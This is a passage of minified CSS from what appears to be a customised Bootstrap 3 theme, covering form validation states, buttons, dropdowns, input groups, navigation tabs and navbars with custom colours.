.has-error .checkbox,.has-error .checkbox-inline,.has-error .control-label,.has-error .help-block,.has-error .radio,.has-error .radio-inline{color:#a94442}
.has-error .form-control{border-color:#a94442;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 1px rgba(0,0,0,.075)}
.has-error .form-control:focus{border-color:#843534;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 6px #ce8483;box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 6px #ce8483}
.has-error .input-group-addon{color:#a94442;border-color:#a94442;background-color:#f2dede}
.has-error .form-control-feedback{color:#a94442}
.has-feedback label.sr-only~.form-control-feedback{top:0}
.help-block{display:block;margin-top:5px;margin-bottom:10px;color:#404040}
@media (min-width:768px){.form-inline .form-group{display:inline-block;margin-bottom:0;vertical-align:middle}
.form-inline .form-control{display:inline-block;width:auto;vertical-align:middle}
.form-inline .input-group{display:inline-table;vertical-align:middle}
.form-inline .input-group .form-control,.form-inline .input-group .input-group-addon,.form-inline .input-group .input-group-btn{width:auto}
.form-inline .input-group>.form-control{width:100%}
.form-inline .control-label{margin-bottom:0;vertical-align:middle}
.form-inline .checkbox,.form-inline .radio{display:inline-block;margin-top:0;margin-bottom:0;vertical-align:middle}
.form-inline .checkbox label,.form-inline .radio label{padding-left:0}
.form-inline .checkbox input[type=checkbox],.form-inline .radio input[type=radio]{position:relative;margin-left:0}
.form-inline .has-feedback .form-control-feedback{top:0}}
.form-horizontal .checkbox,.form-horizontal .checkbox-inline,.form-horizontal .radio,.form-horizontal .radio-inline{margin-top:0;margin-bottom:0;padding-top:7px}
.form-horizontal .checkbox,.form-horizontal .radio{min-height:27px}
.form-horizontal .form-group{margin-left:0;margin-right:0}
@media (min-width:768px){.form-horizontal .control-label{text-align:right;margin-bottom:0;padding-top:7px}}
.form-horizontal .has-feedback .form-control-feedback{top:0;right:0}
@media (min-width:768px){.form-horizontal .form-group-lg .control-label{padding-top:14.3px}}
@media (min-width:768px){.form-horizontal .form-group-sm .control-label{padding-top:6px}}
.btn{display:inline-block;margin-bottom:0;font-weight:400;text-align:center;vertical-align:middle;cursor:pointer;background-image:none;white-space:nowrap;font-size:14px;line-height:1.42857143;border-radius:4px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
.btn.active:focus,.btn:active:focus,.btn:focus{outline-offset:-2px}
.btn:focus,.btn:hover{color:#333;text-decoration:none}
.btn.active,.btn:active{background-image:none}
.btn.disabled,.btn[disabled],fieldset[disabled] .btn{cursor:not-allowed;pointer-events:none;opacity:.65;filter:alpha(opacity=65);-webkit-box-shadow:none;box-shadow:none}
.btn-default{color:#333;background-color:#fff;border-color:#ccc}
.btn-default.active,.btn-default:active,.btn-default:focus,.btn-default:hover,.open>.dropdown-toggle.btn-default{color:#333;background-color:#e6e6e6;border-color:#adadad}
.btn-default.active,.btn-default:active,.open>.dropdown-toggle.btn-default{background-image:none}
.btn-default.disabled,.btn-default.disabled.active,.btn-default.disabled:active,.btn-default.disabled:focus,.btn-default.disabled:hover,.btn-default[disabled],.btn-default[disabled].active,.btn-default[disabled]:active,.btn-default[disabled]:focus,.btn-default[disabled]:hover,fieldset[disabled] .btn-default,fieldset[disabled] .btn-default.active,fieldset[disabled] .btn-default:active,fieldset[disabled] .btn-default:focus,fieldset[disabled] .btn-default:hover{background-color:#fff;border-color:#ccc}
.btn-default .badge{color:#fff;background-color:#333}
.btn-primary{border-color:#5d8db3}
.btn-primary.active,.btn-primary:active,.btn-primary:focus,.btn-primary:hover,.open>.dropdown-toggle.btn-primary{color:#fff;background-color:#477396;border-color:#436e8f}
.btn-primary.active,.btn-primary:active,.open>.dropdown-toggle.btn-primary{background-image:none}
.btn-primary.disabled,.btn-primary.disabled.active,.btn-primary.disabled:active,.btn-primary.disabled:focus,.btn-primary.disabled:hover,.btn-primary[disabled],.btn-primary[disabled].active,.btn-primary[disabled]:active,.btn-primary[disabled]:focus,.btn-primary[disabled]:hover,fieldset[disabled] .btn-primary,fieldset[disabled] .btn-primary.active,fieldset[disabled] .btn-primary:active,fieldset[disabled] .btn-primary:focus,fieldset[disabled] .btn-primary:hover{background-color:#5d8db3;border-color:#5d8db3}
.btn-primary .badge{color:#5d8db3;background-color:#fff}
.btn-success{border-color:#6ac065}
.btn-success.active,.btn-success:active,.btn-success:focus,.btn-success:hover,.open>.dropdown-toggle.btn-success{color:#fff;background-color:#4cac46;border-color:#49a543}
.btn-success.active,.btn-success:active,.open>.dropdown-toggle.btn-success{background-image:none}
.btn-success.disabled,.btn-success.disabled.active,.btn-success.disabled:active,.btn-success.disabled:focus,.btn-success.disabled:hover,.btn-success[disabled],.btn-success[disabled].active,.btn-success[disabled]:active,.btn-success[disabled]:focus,.btn-success[disabled]:hover,fieldset[disabled] .btn-success,fieldset[disabled] .btn-success.active,fieldset[disabled] .btn-success:active,fieldset[disabled] .btn-success:focus,fieldset[disabled] .btn-success:hover{background-color:#6ac065;border-color:#6ac065}
.btn-success .badge{color:#6ac065;background-color:#fff}
.btn-info{color:#fff;background-color:#5bc0de;border-color:#5bc0de}
.btn-info.active,.btn-info:active,.btn-info:focus,.btn-info:hover,.open>.dropdown-toggle.btn-info{color:#fff;background-color:#31b0d5;border-color:#2aabd2}
.btn-info.active,.btn-info:active,.open>.dropdown-toggle.btn-info{background-image:none}
.btn-info.disabled,.btn-info.disabled.active,.btn-info.disabled:active,.btn-info.disabled:focus,.btn-info.disabled:hover,.btn-info[disabled],.btn-info[disabled].active,.btn-info[disabled]:active,.btn-info[disabled]:focus,.btn-info[disabled]:hover,fieldset[disabled] .btn-info,fieldset[disabled] .btn-info.active,fieldset[disabled] .btn-info:active,fieldset[disabled] .btn-info:focus,fieldset[disabled] .btn-info:hover{background-color:#5bc0de;border-color:#5bc0de}
.btn-info .badge{color:#5bc0de;background-color:#fff}
.btn-warning{color:#fff;background-color:#f0ad4e;border-color:#f0ad4e}
.btn-warning.active,.btn-warning:active,.btn-warning:focus,.btn-warning:hover,.open>.dropdown-toggle.btn-warning{color:#fff;background-color:#ec971f;border-color:#eb9316}
.btn-warning.active,.btn-warning:active,.open>.dropdown-toggle.btn-warning{background-image:none}
.btn-warning.disabled,.btn-warning.disabled.active,.btn-warning.disabled:active,.btn-warning.disabled:focus,.btn-warning.disabled:hover,.btn-warning[disabled],.btn-warning[disabled].active,.btn-warning[disabled]:active,.btn-warning[disabled]:focus,.btn-warning[disabled]:hover,fieldset[disabled] .btn-warning,fieldset[disabled] .btn-warning.active,fieldset[disabled] .btn-warning:active,fieldset[disabled] .btn-warning:focus,fieldset[disabled] .btn-warning:hover{background-color:#f0ad4e;border-color:#f0ad4e}
.btn-warning .badge{color:#f0ad4e;background-color:#fff}
.btn-danger{border-color:#c05f5a}
.btn-danger.active,.btn-danger:active,.btn-danger:focus,.btn-danger:hover,.open>.dropdown-toggle.btn-danger{color:#fff;background-color:#a74540;border-color:#a0423d}
.btn-danger.active,.btn-danger:active,.open>.dropdown-toggle.btn-danger{background-image:none}
.btn-danger.disabled,.btn-danger.disabled.active,.btn-danger.disabled:active,.btn-danger.disabled:focus,.btn-danger.disabled:hover,.btn-danger[disabled],.btn-danger[disabled].active,.btn-danger[disabled]:active,.btn-danger[disabled]:focus,.btn-danger[disabled]:hover,fieldset[disabled] .btn-danger,fieldset[disabled] .btn-danger.active,fieldset[disabled] .btn-danger:active,fieldset[disabled] .btn-danger:focus,fieldset[disabled] .btn-danger:hover{background-color:#c05f5a;border-color:#c05f5a}
.btn-danger .badge{color:#c05f5a;background-color:#fff}
.btn-link{font-weight:400;cursor:pointer}
.btn-link,.btn-link:active,.btn-link[disabled],fieldset[disabled] .btn-link{background-color:transparent;-webkit-box-shadow:none;box-shadow:none}
.btn-link,.btn-link:active,.btn-link:focus,.btn-link:hover{border-color:transparent}
.btn-link:focus,.btn-link:hover{color:#3a6d99;text-decoration:underline;background-color:transparent}
.btn-link[disabled]:focus,.btn-link[disabled]:hover,fieldset[disabled] .btn-link:focus,fieldset[disabled] .btn-link:hover{color:#999;text-decoration:none}
.btn-group-lg>.btn,.btn-lg{padding:10px 16px;font-size:18px;line-height:1.33;border-radius:6px}
.btn-group-sm>.btn,.btn-sm{padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}
.btn-group-xs>.btn,.btn-xs{padding:1px 5px;font-size:12px;line-height:1.5;border-radius:3px}
.btn-block{display:block;width:100%}
.btn-block+.btn-block{margin-top:5px}
input[type=button].btn-block,input[type=reset].btn-block,input[type=submit].btn-block{width:100%}
.fade{opacity:0;-webkit-transition:opacity .15s linear;-o-transition:opacity .15s linear;transition:opacity .15s linear}
.fade.in{opacity:1}
.collapse{display:none}
.collapse.in{display:block}
tr.collapse.in{display:table-row}
tbody.collapse.in{display:table-row-group}
.collapsing{position:relative;height:0;overflow:hidden;-webkit-transition:height .35s ease;-o-transition:height .35s ease;transition:height .35s ease}
.caret{display:inline-block;width:0;height:0;margin-left:2px;vertical-align:middle;border-top:4px solid;border-right:4px solid transparent;border-left:4px solid transparent}
.dropdown{position:relative}
.dropdown-toggle:focus{outline:0}
.dropdown-menu{position:absolute;top:100%;left:0;z-index:1000;display:none;float:left;min-width:160px;margin:2px 0 0;list-style:none;font-size:14px;text-align:left;background-color:#fff;border:1px solid #ccc;border:1px solid rgba(0,0,0,.15);background-clip:padding-box}
.dropdown-menu.pull-right{right:0;left:auto}
.dropdown-menu .divider{height:1px;margin:9px 0;overflow:hidden;background-color:#e5e5e5}
.dropdown-menu>li>a{display:block;clear:both;font-weight:400;line-height:1.42857143;color:#333;white-space:nowrap}
.dropdown-menu>li>a:focus,.dropdown-menu>li>a:hover{text-decoration:none;color:#262626;background-color:#f5f5f5}
.dropdown-menu>.active>a,.dropdown-menu>.active>a:focus,.dropdown-menu>.active>a:hover{color:#fff;text-decoration:none;outline:0;background-color:#5d8db3}
.dropdown-menu>.disabled>a,.dropdown-menu>.disabled>a:focus,.dropdown-menu>.disabled>a:hover{color:#999}
.dropdown-menu>.disabled>a:focus,.dropdown-menu>.disabled>a:hover{text-decoration:none;background-color:transparent;background-image:none;filter:progid:DXImageTransform.Microsoft.gradient(enabled=false);cursor:not-allowed}
.open>.dropdown-menu{display:block}
.open>a{outline:0}
.dropdown-menu-right{left:auto;right:0}
.dropdown-menu-left{left:0;right:auto}
.dropdown-header{display:block;padding:3px 20px;font-size:12px;line-height:1.42857143;color:#999;white-space:nowrap}
.dropdown-backdrop{position:fixed;left:0;right:0;bottom:0;top:0;z-index:990}
.pull-right>.dropdown-menu{right:0;left:auto}
.dropup .caret,.navbar-fixed-bottom .dropdown .caret{border-top:0;border-bottom:4px solid;content:""}
.dropup .dropdown-menu,.navbar-fixed-bottom .dropdown .dropdown-menu{top:auto;bottom:100%;margin-bottom:1px}
@media (min-width:480px){.navbar-right .dropdown-menu{left:auto;right:0}
.navbar-right .dropdown-menu-left{left:0;right:auto}}
.btn-group,.btn-group-vertical{position:relative;display:inline-block;vertical-align:middle}
.btn-group-vertical>.btn,.btn-group>.btn{position:relative;float:left}
.btn-group-vertical>.btn.active,.btn-group-vertical>.btn:active,.btn-group-vertical>.btn:focus,.btn-group-vertical>.btn:hover,.btn-group>.btn.active,.btn-group>.btn:active,.btn-group>.btn:focus,.btn-group>.btn:hover{z-index:2}
.btn-group-vertical>.btn:focus,.btn-group>.btn:focus{outline:0}
.btn-group .btn+.btn,.btn-group .btn+.btn-group,.btn-group .btn-group+.btn,.btn-group .btn-group+.btn-group{margin-left:-1px}
.btn-toolbar{margin-left:-5px}
.btn-toolbar .btn-group,.btn-toolbar .input-group{float:left}
.btn-toolbar>.btn,.btn-toolbar>.btn-group,.btn-toolbar>.input-group{margin-left:5px}
.btn-group>.btn:not(:first-child):not(:last-child):not(.dropdown-toggle){border-radius:0}
.btn-group>.btn:first-child{margin-left:0}
.btn-group>.btn:first-child:not(:last-child):not(.dropdown-toggle){border-bottom-right-radius:0;border-top-right-radius:0}
.btn-group>.btn:last-child:not(:first-child),.btn-group>.dropdown-toggle:not(:first-child){border-bottom-left-radius:0;border-top-left-radius:0}
.btn-group>.btn-group{float:left}
.btn-group>.btn-group:not(:first-child):not(:last-child)>.btn{border-radius:0}
.btn-group>.btn-group:first-child>.btn:last-child,.btn-group>.btn-group:first-child>.dropdown-toggle{border-bottom-right-radius:0;border-top-right-radius:0}
.btn-group>.btn-group:last-child>.btn:first-child{border-bottom-left-radius:0;border-top-left-radius:0}
.btn-group .dropdown-toggle:active,.btn-group.open .dropdown-toggle{outline:0}
.btn-group>.btn+.dropdown-toggle{padding-left:8px;padding-right:8px}
.btn-group>.btn-lg+.dropdown-toggle{padding-left:12px;padding-right:12px}
.btn-group.open .dropdown-toggle{-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,.125);box-shadow:inset 0 3px 5px rgba(0,0,0,.125)}
.btn-group.open .dropdown-toggle.btn-link{-webkit-box-shadow:none;box-shadow:none}
.btn .caret{margin-left:0}
.btn-lg .caret{border-width:5px 5px 0}
.dropup .btn-lg .caret{border-width:0 5px 5px}
.btn-group-vertical>.btn,.btn-group-vertical>.btn-group,.btn-group-vertical>.btn-group>.btn{display:block;float:none;width:100%;max-width:100%}
.btn-group-vertical>.btn-group>.btn{float:none}
.btn-group-vertical>.btn+.btn,.btn-group-vertical>.btn+.btn-group,.btn-group-vertical>.btn-group+.btn,.btn-group-vertical>.btn-group+.btn-group{margin-top:-1px;margin-left:0}
.btn-group-vertical>.btn:not(:first-child):not(:last-child){border-radius:0}
.btn-group-vertical>.btn:first-child:not(:last-child){border-top-right-radius:4px;border-bottom-right-radius:0;border-bottom-left-radius:0}
.btn-group-vertical>.btn:last-child:not(:first-child){border-bottom-left-radius:4px;border-top-right-radius:0;border-top-left-radius:0}
.btn-group-vertical>.btn-group:not(:first-child):not(:last-child)>.btn{border-radius:0}
.btn-group-vertical>.btn-group:first-child:not(:last-child)>.btn:last-child,.btn-group-vertical>.btn-group:first-child:not(:last-child)>.dropdown-toggle{border-bottom-right-radius:0;border-bottom-left-radius:0}
.btn-group-vertical>.btn-group:last-child:not(:first-child)>.btn:first-child{border-top-right-radius:0;border-top-left-radius:0}
.btn-group-justified{display:table;width:100%;table-layout:fixed;border-collapse:separate}
.btn-group-justified>.btn,.btn-group-justified>.btn-group{float:none;display:table-cell;width:1%}
.btn-group-justified>.btn-group .btn{width:100%}
.btn-group-justified>.btn-group .dropdown-menu{left:auto}
[data-toggle=buttons]>.btn>input[type=checkbox],[data-toggle=buttons]>.btn>input[type=radio]{position:absolute;z-index:-1;opacity:0;filter:alpha(opacity=0)}
.input-group{position:relative;display:table;border-collapse:separate}
.input-group[class*=col-]{float:none;padding-left:0;padding-right:0}
.input-group .form-control{position:relative;z-index:2;float:left;width:100%;margin-bottom:0}
.input-group-lg>.form-control,.input-group-lg>.input-group-addon,.input-group-lg>.input-group-btn>.btn{height:46px;padding:10px 16px;font-size:18px;line-height:1.33;border-radius:6px}
select.input-group-lg>.form-control,select.input-group-lg>.input-group-addon,select.input-group-lg>.input-group-btn>.btn{height:46px;line-height:46px}
select[multiple].input-group-lg>.form-control,select[multiple].input-group-lg>.input-group-addon,select[multiple].input-group-lg>.input-group-btn>.btn,textarea.input-group-lg>.form-control,textarea.input-group-lg>.input-group-addon,textarea.input-group-lg>.input-group-btn>.btn{height:auto}
.input-group-sm>.form-control,.input-group-sm>.input-group-addon,.input-group-sm>.input-group-btn>.btn{height:30px;padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}
select.input-group-sm>.form-control,select.input-group-sm>.input-group-addon,select.input-group-sm>.input-group-btn>.btn{height:30px;line-height:30px}
select[multiple].input-group-sm>.form-control,select[multiple].input-group-sm>.input-group-addon,select[multiple].input-group-sm>.input-group-btn>.btn,textarea.input-group-sm>.form-control,textarea.input-group-sm>.input-group-addon,textarea.input-group-sm>.input-group-btn>.btn{height:auto}
.input-group .form-control,.input-group-addon,.input-group-btn{display:table-cell}
.input-group .form-control:not(:first-child):not(:last-child),.input-group-addon:not(:first-child):not(:last-child),.input-group-btn:not(:first-child):not(:last-child){border-radius:0}
.input-group-addon,.input-group-btn{width:1%;white-space:nowrap;vertical-align:middle}
.input-group-addon{padding:6px 12px;font-size:14px;font-weight:400;line-height:1;color:#000;text-align:center;background-color:#eee;border:1px solid #ccc;border-radius:4px}
.input-group-addon.input-sm{padding:5px 10px;font-size:12px;border-radius:3px}
.input-group-addon.input-lg{padding:10px 16px;font-size:18px;border-radius:6px}
.input-group-addon input[type=checkbox],.input-group-addon input[type=radio]{margin-top:0}
.input-group .form-control:first-child,.input-group-addon:first-child,.input-group-btn:first-child>.btn,.input-group-btn:first-child>.btn-group>.btn,.input-group-btn:first-child>.dropdown-toggle,.input-group-btn:last-child>.btn-group:not(:last-child)>.btn,.input-group-btn:last-child>.btn:not(:last-child):not(.dropdown-toggle){border-bottom-right-radius:0;border-top-right-radius:0}
.input-group-addon:first-child{border-right:0}
.input-group .form-control:last-child,.input-group-addon:last-child,.input-group-btn:first-child>.btn-group:not(:first-child)>.btn,.input-group-btn:first-child>.btn:not(:first-child),.input-group-btn:last-child>.btn,.input-group-btn:last-child>.btn-group>.btn,.input-group-btn:last-child>.dropdown-toggle{border-bottom-left-radius:0;border-top-left-radius:0}
.input-group-addon:last-child{border-left:0}
.input-group-btn{position:relative;font-size:0;white-space:nowrap}
.input-group-btn>.btn{position:relative}
.input-group-btn>.btn+.btn{margin-left:-1px}
.input-group-btn>.btn:active,.input-group-btn>.btn:focus,.input-group-btn>.btn:hover{z-index:2}
.input-group-btn:first-child>.btn,.input-group-btn:first-child>.btn-group{margin-right:-1px}
.input-group-btn:last-child>.btn,.input-group-btn:last-child>.btn-group{margin-left:-1px}
.nav{margin-bottom:0;padding-left:0;list-style:none}
.nav>li{position:relative;display:block}
.nav>li>a{position:relative;display:block;padding:10px 15px}
.nav>li>a:focus,.nav>li>a:hover{text-decoration:none;background-color:#eee}
.nav>li.disabled>a{color:#999}
.nav>li.disabled>a:focus,.nav>li.disabled>a:hover{color:#999;text-decoration:none;background-color:transparent;cursor:not-allowed}
.nav .open>a,.nav .open>a:focus,.nav .open>a:hover{background-color:#eee;border-color:#3a6d99}
.nav .nav-divider{height:1px;margin:9px 0;overflow:hidden;background-color:#e5e5e5}
.nav>li>a>img{max-width:none}
.nav-tabs{border-bottom:1px solid #ddd}
.nav-tabs>li{float:left;margin-bottom:-1px}
.nav-tabs>li>a{margin-right:2px;line-height:1.42857143;border:1px solid transparent;border-radius:4px 4px 0 0}
.nav-tabs>li>a:hover{border-color:#eee #eee #ddd}
.nav-tabs>li.active>a,.nav-tabs>li.active>a:focus,.nav-tabs>li.active>a:hover{color:#555;background-color:#fff;border:1px solid #ddd;border-bottom-color:transparent;cursor:default}
.nav-tabs.nav-justified{width:100%;border-bottom:0}
.nav-tabs.nav-justified>li{float:none}
.nav-tabs.nav-justified>li>a{text-align:center;margin-bottom:5px}
.nav-tabs.nav-justified>.dropdown .dropdown-menu{top:auto;left:auto}
@media (min-width:768px){.nav-tabs.nav-justified>li{display:table-cell;width:1%}
.nav-tabs.nav-justified>li>a{margin-bottom:0}}
.nav-tabs.nav-justified>li>a{margin-right:0;border-radius:4px}
.nav-tabs.nav-justified>.active>a,.nav-tabs.nav-justified>.active>a:focus,.nav-tabs.nav-justified>.active>a:hover{border:1px solid #ddd}
@media (min-width:768px){.nav-tabs.nav-justified>li>a{border-bottom:1px solid #ddd;border-radius:4px 4px 0 0}
.nav-tabs.nav-justified>.active>a,.nav-tabs.nav-justified>.active>a:focus,.nav-tabs.nav-justified>.active>a:hover{border-bottom-color:#fff}}
.nav-pills>li{float:left}
.nav-pills>li>a{border-radius:4px}
.nav-pills>li+li{margin-left:2px}
.nav-pills>li.active>a,.nav-pills>li.active>a:focus,.nav-pills>li.active>a:hover{color:#fff;background-color:#5d8db3}
.nav-stacked>li{float:none}
.nav-stacked>li+li{margin-top:2px;margin-left:0}
.nav-justified{width:100%}
.nav-justified>li{float:none}
.nav-justified>li>a{text-align:center;margin-bottom:5px}
.nav-justified>.dropdown .dropdown-menu{top:auto;left:auto}
@media (min-width:768px){.nav-justified>li{display:table-cell;width:1%}
.nav-justified>li>a{margin-bottom:0}}
.nav-tabs-justified{border-bottom:0}
.nav-tabs-justified>li>a{margin-right:0;border-radius:4px}
.nav-tabs-justified>.active>a,.nav-tabs-justified>.active>a:focus,.nav-tabs-justified>.active>a:hover{border:1px solid #ddd}
@media (min-width:768px){.nav-tabs-justified>li>a{border-bottom:1px solid #ddd;border-radius:4px 4px 0 0}
.nav-tabs-justified>.active>a,.nav-tabs-justified>.active>a:focus,.nav-tabs-justified>.active>a:hover{border-bottom-color:#fff}}
.tab-content>.tab-pane{display:none}
.tab-content>.active{display:block}
.nav-tabs .dropdown-menu{margin-top:-1px;border-top-right-radius:0;border-top-left-radius:0}
.navbar{position:relative;min-height:44px;margin-bottom:20px;border:1px solid transparent}
@media (min-width:480px){.navbar{border-radius:4px}}
@media (min-width:480px){.navbar-header{float:left}}
.navbar-collapse{overflow-x:visible;padding-right:0;padding-left:0;border-top:1px solid transparent;box-shadow:inset 0 1px 0 rgba(255,255,255,.1);-webkit-overflow-scrolling:touch}
.navbar-collapse.in{overflow-y:auto}
@media (min-width:480px){.navbar-collapse{width:auto;border-top:0;box-shadow:none}
.navbar-collapse.collapse{display:block!important;height:auto!important;padding-bottom:0;overflow:visible!important}
.navbar-collapse.in{overflow-y:visible}
.navbar-fixed-bottom .navbar-collapse,.navbar-fixed-top .navbar-collapse,.navbar-static-top .navbar-collapse{padding-left:0;padding-right:0}}
.navbar-fixed-bottom .navbar-collapse,.navbar-fixed-top .navbar-collapse{max-height:340px}
@media (max-width:480px) and (orientation:landscape){.navbar-fixed-bottom .navbar-collapse,.navbar-fixed-top .navbar-collapse{max-height:200px}}
.container-fluid>.navbar-collapse,.container-fluid>.navbar-header,.container>.navbar-collapse,.container>.navbar-header{margin-right:0;margin-left:0}
@media (min-width:480px){.container-fluid>.navbar-collapse,.container-fluid>.navbar-header,.container>.navbar-collapse,.container>.navbar-header{margin-right:0;margin-left:0}}
.navbar-static-top{z-index:1000;border-width:0 0 1px}
@media (min-width:480px){.navbar-static-top{border-radius:0}}
.navbar-fixed-bottom,.navbar-fixed-top{position:fixed;right:0;left:0;z-index:1030;-webkit-transform:translate3d(0,0,0);transform:translate3d(0,0,0)}
@media (min-width:480px){.navbar-fixed-bottom,.navbar-fixed-top{border-radius:0}}
.navbar-fixed-top{top:0;border-width:0 0 1px}
.navbar-fixed-bottom{bottom:0;margin-bottom:0;border-width:1px 0 0}
.navbar-brand{float:left;padding:12px 0;font-size:18px;line-height:20px;height:44px}
.navbar-brand:focus,.navbar-brand:hover{text-decoration:none}
@media (min-width:480px){.navbar>.container .navbar-brand,.navbar>.container-fluid .navbar-brand{margin-left:0}}
.navbar-toggle{position:relative;float:right;margin-right:0;padding:9px 10px;margin-top:5px;margin-bottom:5px;background-color:transparent;background-image:none;border:1px solid transparent;border-radius:4px}
.navbar-toggle:focus{outline:0}
.navbar-toggle .icon-bar{display:block;width:22px;height:2px;border-radius:1px}
.navbar-toggle .icon-bar+.icon-bar{margin-top:4px}
@media (min-width:480px){.navbar-toggle{display:none}}
.navbar-nav{margin:6px 0}
.navbar-nav>li>a{padding-top:10px;padding-bottom:10px;line-height:20px}
@media (max-width:479px){.navbar-nav .open .dropdown-menu{position:static;float:none;width:auto;margin-top:0;background-color:transparent;border:0;box-shadow:none}
.navbar-nav .open .dropdown-menu .dropdown-header,.navbar-nav .open .dropdown-menu>li>a{padding:5px 15px 5px 25px}
.navbar-nav .open .dropdown-menu>li>a{line-height:20px}
.navbar-nav .open .dropdown-menu>li>a:focus,.navbar-nav .open .dropdown-menu>li>a:hover{background-image:none}}
@media (min-width:480px){.navbar-nav{float:left;margin:0}
.navbar-nav>li{float:left}
.navbar-nav>li>a{padding-top:12px;padding-bottom:12px}
.navbar-nav.navbar-right:last-child{margin-right:0}}
@media (min-width:480px){.navbar-left{float:left!important}
.navbar-right{float:right!important}}
.navbar-form{margin:5px 0;padding:10px 0;border-top:1px solid transparent;border-bottom:1px solid transparent;-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,.1),0 1px 0 rgba(255,255,255,.1);box-shadow:inset 0 1px 0 rgba(255,255,255,.1),0 1px 0 rgba(255,255,255,.1)}
@media (min-width:768px){.navbar-form .form-group{display:inline-block;margin-bottom:0;vertical-align:middle}
.navbar-form .form-control{display:inline-block;width:auto;vertical-align:middle}
.navbar-form .input-group{display:inline-table;vertical-align:middle}
.navbar-form .input-group .form-control,.navbar-form .input-group .input-group-addon,.navbar-form .input-group .input-group-btn{width:auto}
.navbar-form .input-group>.form-control{width:100%}
.navbar-form .control-label{margin-bottom:0;vertical-align:middle}
.navbar-form .checkbox,.navbar-form .radio{display:inline-block;margin-top:0;margin-bottom:0;vertical-align:middle}
.navbar-form .checkbox label,.navbar-form .radio label{padding-left:0}
.navbar-form .checkbox input[type=checkbox],.navbar-form .radio input[type=radio]{position:relative;margin-left:0}
.navbar-form .has-feedback .form-control-feedback{top:0}}
@media (max-width:479px){.navbar-form .form-group{margin-bottom:5px}}
@media (min-width:480px){.navbar-form{width:auto;border:0;margin-left:0;margin-right:0;padding-top:0;padding-bottom:0;-webkit-box-shadow:none;box-shadow:none}
.navbar-form.navbar-right:last-child{margin-right:0}}
.navbar-nav>li>.dropdown-menu{margin-top:0;border-top-right-radius:0;border-top-left-radius:0}
.navbar-fixed-bottom .navbar-nav>li>.dropdown-menu{border-bottom-right-radius:0;border-bottom-left-radius:0}
.navbar-btn{margin-top:5px;margin-bottom:5px}
.navbar-btn.btn-sm{margin-top:7px;margin-bottom:7px}
.navbar-btn.btn-xs{margin-top:11px;margin-bottom:11px}
.navbar-text{margin-top:12px;margin-bottom:12px}
@media (min-width:480px){.navbar-text{float:left;margin-left:0;margin-right:0}
.navbar-text.navbar-right:last-child{margin-right:0}}
.navbar-default{background-color:#f8f8f8;border-color:#e7e7e7}
.navbar-default .navbar-brand{color:#777}
.navbar-default .navbar-brand:focus,.navbar-default .navbar-brand:hover{color:#5e5e5e;background-color:transparent}
.navbar-default .navbar-nav>li>a,.navbar-default .navbar-text{color:#777}
.navbar-default .navbar-nav>li>a:focus,.navbar-default .navbar-nav>li>a:hover{color:#333;background-color:transparent}
.navbar-default .navbar-nav>.active>a,.navbar-default .navbar-nav>.active>a:focus,.navbar-default .navbar-nav>.active>a:hover{color:#555;background-color:#e7e7e7}
.navbar-default .navbar-nav>.disabled>a,.navbar-default .navbar-nav>.disabled>a:focus,.navbar-default .navbar-nav>.disabled>a:hover{color:#ccc;background-color:transparent}
.navbar-default .navbar-toggle{border-color:#ddd}
.navbar-default .navbar-toggle:focus,.navbar-default .navbar-toggle:hover{background-color:#ddd}
.navbar-default .navbar-toggle .icon-bar{background-color:#888}
.navbar-default .navbar-collapse,.navbar-default .navbar-form{border-color:#e7e7e7}
.navbar-default .navbar-nav>.open>a,.navbar-default .navbar-nav>.open>a:focus,.navbar-default .navbar-nav>.open>a:hover{background-color:#e7e7e7;color:#555}
@media (max-width:479px){.navbar-default .navbar-nav .open .dropdown-menu>li>a{color:#777}
.navbar-default .navbar-nav .open .dropdown-menu>li>a:focus,.navbar-default .navbar-nav .open .dropdown-menu>li>a:hover{color:#333;background-color:transparent}
.navbar-default .navbar-nav .open .dropdown-menu>.active>a,.navbar-default .navbar-nav .open .dropdown-menu>.active>a:focus,.navbar-default .navbar-nav .open .dropdown-menu>.active>a:hover{color:#555;background-color:#e7e7e7}
.navbar-default .navbar-nav .open .dropdown-menu>.disabled>a,.navbar-default .navbar-nav .open .dropdown-menu>.disabled>a:focus,.navbar-default .navbar-nav .open .dropdown-menu>.disabled>a:hover{color:#ccc;background-color:transparent}}
.navbar-default .navbar-link{color:#777}
.navbar-default .navbar-link:hover{color:#333}
.navbar-default .btn-link{color:#777}
.navbar-default .btn-link:focus,.navbar-default .btn-link:hover{color:#333}
.navbar-default .btn-link[disabled]:focus,.navbar-default .btn-link[disabled]:hover,fieldset[disabled] .navbar-default .btn-link:focus,fieldset[disabled] .navbar-default .btn-link:hover{color:#ccc}
.navbar-inverse{background-color:#497495;border-color:#385973}
.navbar-inverse .navbar-brand{color:#999}
.navbar-inverse .navbar-brand:focus,.navbar-inverse .navbar-brand:hover{color:#fff;background-color:transparent}
.navbar-inverse .navbar-nav>li>a,.navbar-inverse .navbar-text{color:#999}
.navbar-inverse .navbar-nav>li>a:focus,.navbar-inverse .navbar-nav>li>a:hover{color:#fff;background-color:transparent}
.navbar-inverse .navbar-nav>.active>a,.navbar-inverse .navbar-nav>.active>a:focus,.navbar-inverse .navbar-nav>.active>a:hover{color:#fff;background-color:#385973}
.navbar-inverse .navbar-nav>.disabled>a,.navbar-inverse .navbar-nav>.disabled>a:focus,.navbar-inverse .navbar-nav>.disabled>a:hover{color:#444;background-color:transparent}
.navbar-inverse .navbar-toggle{border-color:#333}
.navbar-inverse .navbar-toggle:focus,.navbar-inverse .navbar-toggle:hover{background-color:#333}
.navbar-inverse .navbar-toggle .icon-bar{background-color:#fff}
.navbar-inverse .navbar-collapse,.navbar-inverse .navbar-form{border-color:#3d617d}
.navbar-inverse .navbar-nav>.open>a,.navbar-inverse .navbar-nav>.open>a:focus,.navbar-inverse .navbar-nav>.open>a:hover{background-color:#385973;color:#fff}
@media (max-width:479px){.navbar-inverse .navbar-nav .open .dropdown-menu>.dropdown-header{border-color:#385973}
.navbar-inverse .navbar-nav .open .dropdown-menu .divider{background-color:#385973}
.navbar-inverse .navbar-nav .open .dropdown-menu>li>a{color:#999}
